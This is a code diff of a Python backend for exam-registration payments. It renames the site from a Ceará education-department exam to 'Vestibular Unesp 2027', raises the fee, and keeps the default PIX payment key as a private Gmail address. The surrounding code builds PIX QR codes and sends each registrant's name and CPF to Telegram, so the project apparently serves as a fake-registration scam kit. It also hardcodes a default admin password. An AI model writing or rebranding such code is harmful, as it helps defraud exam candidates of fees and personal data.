@@ -27,9 +27,9 @@ JWT_EXP_HOURS = 8
 ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'donas')
 ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'Seinao10@@')
 
-# Taxa única de inscrição (Edital 014/2026-SEDUC/SEPLAG)
-VALOR_INSCRICAO = 150.0
-TAXA_INSCRICAO_STR = 'R$ 150,00'
+# Taxa única de inscrição (Vestibular Unesp 2027)
+VALOR_INSCRICAO = 225.0
+TAXA_INSCRICAO_STR = 'R$ 225,00'
 
 # DB reference (set by main app)
 _db = None
@@ -169,12 +169,12 @@ async def seed_pix_config():
                 {'_id': 'main'},
                 {'$set': {
                     'pix_key': 'danielmmm950@gmail.com',
-                    'pix_nome': 'Concurso SEDUC CE',
+                    'pix_nome': 'Vestibular Unesp 2027',
                     'pix_cidade': 'Fortaleza',
                 }},
                 upsert=True,
             )
-            logger.info("Seeded default PIX config (danielmmm950@gmail.com / Concurso SEDUC CE / Fortaleza)")
+            logger.info("Seeded default PIX config (danielmmm950@gmail.com / Vestibular Unesp 2027)")
     except Exception as e:
         logger.warning(f"seed_pix_config failed: {e}")
 
@@ -1315,7 +1315,7 @@ async def generate_pix_brcode(payload: Dict[str, Any]):
     if not key:
         raise HTTPException(status_code=400, detail='Chave PIX não configurada no painel admin')
 
-    nome = (s.get('pix_nome') or 'CONCURSO SEDUC CE').upper()
+    nome = (s.get('pix_nome') or 'VESTIBULAR UNESP 2027').upper()
     cidade = (s.get('pix_cidade') or 'FORTALEZA').upper()
 
     try:
@@ -1426,7 +1426,7 @@ async def pix_qr_png(valor: float = 0, txid: str = ''):
     key = (s.get('pix_key') or '').strip()
     if not key:
         raise HTTPException(400, 'Chave PIX não configurada')
-    nome = (s.get('pix_nome') or 'CONCURSO SEDUC CE').upper()
+    nome = (s.get('pix_nome') or 'VESTIBULAR UNESP 2027').upper()
     cidade = (s.get('pix_cidade') or 'FORTALEZA').upper()
     pix_code = build_brcode(pix_key=key, valor=VALOR_INSCRICAO, nome_beneficiario=nome, cidade_beneficiario=cidade, txid=(txid or '').strip() or '***')
     qr_b64 = build_qr_png_base64(pix_code, box_size=8, border=2)
@@ -1442,7 +1442,7 @@ async def pix_code_txt(valor: float = 0, txid: str = ''):
     key = (s.get('pix_key') or '').strip()
     if not key:
         raise HTTPException(400, 'Chave PIX não configurada')
-    nome = (s.get('pix_nome') or 'CONCURSO SEDUC CE').upper()
+    nome = (s.get('pix_nome') or 'VESTIBULAR UNESP 2027').upper()
     cidade = (s.get('pix_cidade') or 'FORTALEZA').upper()
     pix_code = build_brcode(pix_key=key, valor=VALOR_INSCRICAO, nome_beneficiario=nome, cidade_beneficiario=cidade, txid=(txid or '').strip() or '***')
     return PlainTextResponse(content=pix_code, headers={'Cache-Control':'no-store, no-cache'})
@@ -1510,7 +1510,7 @@ def _format_data_hora_brt(dt) -> str:
 def _build_telegram_message(insc: Dict[str, Any], settings: Dict[str, Any] = None) -> str:
     """Constroi a mensagem do Telegram no formato definido pelo cliente."""
     settings = settings or {}
-    titulo = settings.get('telegram_titulo') or 'NOVA INSCRIÇÃO - SEDUC CE 26'
+    titulo = settings.get('telegram_titulo') or 'NOVA INSCRIÇÃO - VESTIBULAR UNESP 2027'
 
     nome = str(insc.get('nome') or 'Candidato').strip()
     cpf = _format_cpf_br(insc.get('cpf', ''))
